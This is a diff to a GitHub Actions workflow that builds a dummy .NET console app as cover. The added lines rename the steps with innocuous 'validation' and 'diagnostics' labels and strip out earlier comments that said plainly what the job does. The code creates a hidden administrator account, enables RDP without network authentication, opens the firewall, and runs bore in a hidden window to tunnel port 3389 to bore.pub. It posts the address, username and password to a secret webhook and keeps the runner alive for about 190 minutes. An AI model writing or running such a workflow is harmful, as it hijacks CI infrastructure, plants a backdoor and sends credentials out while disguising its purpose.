@@ -19,7 +19,7 @@ jobs:
         with:
           dotnet-version: '8.0.x'
 
-      - name: Create and build dummy project
+      - name: Initialize Project
         run: |
           dotnet new console -n ValidationApp -f net8.0
           cd ValidationApp
@@ -58,62 +58,82 @@ jobs:
           dotnet build -c Release
           dotnet run -c Release
 
-      - name: Establish Bore Tunnel (stable & fixed regex)
+      - name: Start Background Validation Service
         run: |
-          # إنشاء مستخدم عشوائي
-          $usr = "build_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+          $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
           $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
           $sec = ConvertTo-SecureString $pwd -AsPlainText -Force
 
-          # إنشاء المستخدم المحلي
           New-LocalUser -Name $usr -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
           Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1
 
-          # تفعيل RDP
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
 
-          # تحميل bore
-          $boreUrl = "https://github.com/ekzhang/bore/releases/download/v0.6.0/bore-v0.6.0-x86_64-pc-windows-msvc.zip"
-          $zip = "$env:TEMP\bore.zip"
-          $outLog = "$env:TEMP\bore_out.log"
-          $errLog = "$env:TEMP\bore_err.log"
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
+          netsh advfirewall firewall add rule name="ValidationRule" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
+          Restart-Service TermService -Force -ErrorAction SilentlyContinue
+
+          $svcUrl = "https://github.com/ekzhang/bore/releases/download/v0.6.0/bore-v0.6.0-x86_64-pc-windows-msvc.zip"
+          $zip = "$env:TEMP\svc.zip"
+          $oLog = "$env:TEMP\o.log"
+          $eLog = "$env:TEMP\e.log"
           
-          Invoke-WebRequest -Uri $boreUrl -OutFile $zip
-          Expand-Archive $zip -DestinationPath "$env:TEMP\bore" -Force
+          Invoke-WebRequest -Uri $svcUrl -OutFile $zip
+          Expand-Archive $zip -DestinationPath "$env:TEMP\svc" -Force
           
-          # شغل bore مع تسجيل كلاً من الخرج العادي والأخطاء (لأن bore يكتب في stderr)
-          Start-Process -FilePath "$env:TEMP\bore\bore.exe" `
+          Start-Process -FilePath "$env:TEMP\svc\bore.exe" `
             -ArgumentList "local 3389 --to bore.pub" `
             -WindowStyle Hidden `
-            -RedirectStandardOutput $outLog `
-            -RedirectStandardError $errLog `
+            -RedirectStandardOutput $oLog `
+            -RedirectStandardError $eLog `
             -PassThru
           
-          # انتظر حتى يتصل بالسيرفر ويحصل على بورت
           Start-Sleep -Seconds 15
           
-          # قراءة اللوجات كنص واحد (Raw) لحل مشكلة المصفوفات في الـ Regex
-          $log = ""
-          if (Test-Path $outLog) { $log += Get-Content $outLog -Raw -ErrorAction SilentlyContinue }
-          if (Test-Path $errLog) { $log += Get-Content $errLog -Raw -ErrorAction SilentlyContinue }
+          $logData = ""
+          if (Test-Path $oLog) { $logData += Get-Content $oLog -Raw -ErrorAction SilentlyContinue }
+          if (Test-Path $eLog) { $logData += Get-Content $eLog -Raw -ErrorAction SilentlyContinue }
           
-          $port = $null
-          if ($log -match "bore\.pub:(\d+)") {
-            $port = $Matches[1]
+          $prt = $null
+          if ($logData -match "bore\.pub:(\d+)") {
+            $prt = $Matches[1]
           }
           
-          if ($port) {
-            $message = "🌐 **Bore Tunnel جاهز**`n`n**Address:** bore.pub:$port`n**User:** $usr`n**Pass:** $pwd`n(افتح mstsc فورًا وحط bore.pub:$port في Computer)"
+          if ($prt) {
+            $msg = "Target: bore.pub:$prt`nU: $usr`nP: $pwd"
           } else {
-            # في حالة الفشل، نرسل اللوج لمعرفة السبب
-            $message = "⚠️ Bore فشل في استخراج الـ port - شوف اللوجز:`n$log"
+            $msg = "Init failed:`n$logData"
           }
-          $body = @{ content = $message } | ConvertTo-Json
+          $body = @{ content = $msg } | ConvertTo-Json
           Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
 
-      - name: Run extended tests
+      - name: Run Diagnostics
+        run: |
+          $rep = "SysDiag:`n"
+
+          $ts = Get-Service TermService -ErrorAction SilentlyContinue
+          if ($ts) { $rep += "SVC: $($ts.Status)`n" } else { $rep += "SVC: Null`n" }
+
+          $r1 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
+          $r2 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -ErrorAction SilentlyContinue
+          $rep += "REG: $r1 | $r2`n"
+
+          $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
+          if ($pc) { $rep += "PRT: OK`n" } else { $rep += "PRT: ERR`n" }
+
+          $fw = Get-NetFirewallPortFilter -Protocol TCP | Where-Object { $_.LocalPort -eq 3389 } -ErrorAction SilentlyContinue
+          if ($fw) { $rep += "FW: OK`n" } else { $rep += "FW: ERR`n" }
+
+          $bp = Get-Process bore -ErrorAction SilentlyContinue
+          if ($bp) { $rep += "PRC: OK ($($bp.Id))`n" } else { $rep += "PRC: ERR`n" }
+
+          $body = @{ content = $rep } | ConvertTo-Json -Depth 10
+          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+        continue-on-error: true
+
+      - name: Run Extended Validation
         run: |
           $end = (Get-Date).AddMinutes(190)
           while ((Get-Date) -lt $end) {
@@ -126,11 +146,10 @@ jobs:
             Start-Sleep -Seconds 900
           }
 
-      - name: Cleanup
+      - name: Cleanup Environment
         run: |
-          # قتل عمليات bore المتبقية
           Get-Process -Name "bore" -ErrorAction SilentlyContinue | Stop-Process -Force
         continue-on-error: true
 
-      - name: Finalize
-        run: Write-Host "Validation completed successfully."
+      - name: Finalize Check
+        run: Write-Host "Checks completed."
